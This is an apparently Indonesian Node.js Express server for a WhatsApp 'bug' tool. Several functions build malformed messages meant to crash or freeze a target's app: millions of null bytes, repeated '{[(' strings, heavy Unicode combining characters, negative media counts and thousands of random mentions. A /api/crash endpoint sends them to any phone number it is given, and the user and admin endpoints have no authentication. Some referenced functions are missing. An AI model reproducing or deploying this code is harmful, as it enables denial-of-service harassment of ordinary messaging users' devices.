const express = require("express");
const fs = require("fs");
const crypto = require("crypto");
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static("public"));

const loadUsers = () => JSON.parse(fs.readFileSync("./users.json", "utf8"));
const saveUsers = (data) => fs.writeFileSync("./users.json", JSON.stringify(data, null, 2));

app.post("/api/add-user", (req, res) => {
  const { phone, role } = req.body;
  const users = loadUsers();
  users.push({ phone, role });
  saveUsers(users);
  res.json({ success: true, message: "User added." });
});

app.post("/api/add-admin", (req, res) => {
  const { phone } = req.body;
  const users = loadUsers();
  users.push({ phone, role: "admin" });
  saveUsers(users);
  res.json({ success: true, message: "Admin added." });
});

app.post("/api/change-role", (req, res) => {
  const { phone, newRole } = req.body;
  const users = loadUsers();
  const user = users.find(u => u.phone === phone);
  if (user) {
    user.role = newRole;
    saveUsers(users);
    res.json({ success: true, message: "Role updated." });
  } else {
    res.status(404).json({ success: false, message: "User not found." });
  }
});

// TARO FUNCTIONMY

//SARR
async function crashnew(target) {
  const payload = {
    contextInfo: {
      mentionedJid: [undefined, null],
      forwardingScore: -9999,
      isForwarded: true,
      participant: null,
      remoteJid: undefined,
      quotedMessage: {
        conversation: "\u0000".repeat(9999999)
      }
    }
  }
  await pnx.relayMessage(target, {
    albumMessage: {
      caption: " ─ 𝗦𝗮𝗿-𝗫. ",
      mediaCount: -99999999,
      firstMedia: {},
      contextInfo: payload.contextInfo
    }
  }, { messageId: "alb_" + Date.now(), participant: null });
  await pnx.relayMessage(target, {
    contactMessage: {
      displayName: "\u0000".repeat(50000),
      vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:\nTEL;waid=666666666666:\nEND:VCARD",
      contextInfo: payload.contextInfo
    }
  }, { messageId: "ctc_" + Date.now(), participant: null });
  await pnx.relayMessage(target, {
    nativeFlowMessage: {
      buttons: [],
      messageParamsJson: "{[(".repeat(10000),
      flowToken: "",
      content: {
        namespace: "",
        locale: "",
        fallbackLg: "",
        fallbackLc: "",
        title: "𝗦𝗮𝗿-𝗫",
        description: "\u0000".repeat(10000),
        buttonText: "\u0000".repeat(10000),
      },
      contextInfo: payload.contextInfo
    }
  }, { messageId: "flw_" + Date.now(), participant: null });
  await pnx.relayMessage(target, {
    viewOnceMessage: {
      message: {
        imageMessage: {
          caption: " ─ 𝗦𝗮𝗿-𝗫. ",
          jpegThumbnail: Buffer.alloc(1),
          contextInfo: payload.contextInfo
        }
      }
    }
  }, { messageId: "vom_" + Date.now(), participant: null });
  await pnx.sendMessage(target, {
    text: "",
    contextInfo: payload.contextInfo
  });
}

//SARR2
async function DelayInvisible(target, sock) {
    try {
        
        const buttons = Array.from({ length: 3 }, (_, index) => ({
            name: "cta_copy",
            buttonParamsJson: JSON.stringify({
                display_text: "COPY",
                id: `copy_${index}`,
                copy_code: "X"
            })
        }));

        for (let i = 0; i < 10; i++) {
            const content = {
            message: {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "𝗦𝗮𝗿-𝗫?",
                                subtitle: "",
                                hasMediaAttachment: false,
                            },
                            body: {
                                text: "𝗦𝗮𝗿-𝗫 bag bug"
                            },
                            nativeFlowMessage: {
                                buttons,
                                messageParamsJson: "{}"
                            }
                        }
                    }
                }
            };

            const msg = generateWAMessageFromContent(target, content, {});

            await sock.relayMessage(target, msg.message, {
                messageId: msg.key.id
            });

            await new Promise((resolve) => setTimeout(resolve, 200));
        }

        console.log("success bug by 𝗦𝗮𝗿-𝗫👋");

    } catch (err) {
        console.error("Error:", err);
    }
}
//Sarr 3
async function uiIos(sock, target) {
  await sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          listResponseMessage: {
            title: "Permission Emperorz" + 
          "҉҈⃝⃞⃟⃠⃤꙰꙲꙱".repeat(10000),
            description: "؄؂؂؀؁ب".repeat(180000),
            listType: 1,
            singleSelectReply: {
              selectedRowId: "3 Collabs"
            }
          }
        }
      }
    },
    { ephemeralExpiration: 5, timeStamp: Date.now() }
  );
}
//Sarr 4
async function betadelayNew(xrelly, x, z) {
    let msg = await generateWAMessageFromContent(x, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "𝗦𝗮𝗿-𝗫 Is Coming!!!",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 0,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
    });

    await xrelly.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [x],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: x }, content: undefined }
                ]
            }]
        }]
    });

    await sleep(1000);

    if (z) {
        await xrelly.relayMessage(x, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25,
                    },
                },
            },
        }, {});
    }
}
//Sarr 5
async function FcUiFlows(sock, target) {
  const mentionedJidList = [
    target,
    "13135550002@s.whatsapp.net",
    ...Array.from({ length: 2000 }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const Params = "{[(".repeat(20000);

  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "",
            hasMediaAttachment: false
          },
          body: {
            text: "</𖥂 S̷̢͔̤̭̹̖̃͒͘a̴̛̤̙̽̌̍̌̔͘͘͠r̵̜̳͎̈̌͐͗̇̕-̸͖͈͍͝X̷̺͇̯̲̋̀̀̉͜
\\>"
          },
          nativeFlowMessage: {
            messageParamsJson: Params,
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({ status: true })
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true })
              },
              {
                name: "send_location",
                buttonParamsJson: "{}"
              },
              {
                name: "payment_method",
                buttonParamsJson: ""
              },
              {
                name: "form_message",
                buttonParamsJson: ""
              },
              {
                name: "catalog_message",
                buttonParamsJson: ""
              },
              {
                name: "review_and_pay",
                buttonParamsJson: ""
              },
              {
                name: "mpm",
                buttonParamsJson: ""
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            forwardingScore: 250208,
            isForwarded: false,
            mentionedJid: mentionedJidList
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target }
  });

  await sleep(1);

  await sock.sendMessage(target, { delete: msg.key });
}
//BATES FUNCTION 

app.post("/api/crash", async (req, res) => {
  const { target } = req.body;
  if (!target) {
    return res.status(400).json({ success: false, message: "Target number is required." });
  }

  try {
    await InvisibleHome(target, {}); // Dummy sock untuk testing lokal //InvisibleHome ubah ke nama asyn functionnya
    res.json({ success: true, message: `Bug terkirim ke ${target}` });
  } catch (err) {
    res.status(500).json({ success: false, message: "Gagal kirim bug", error: err.message });
  }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
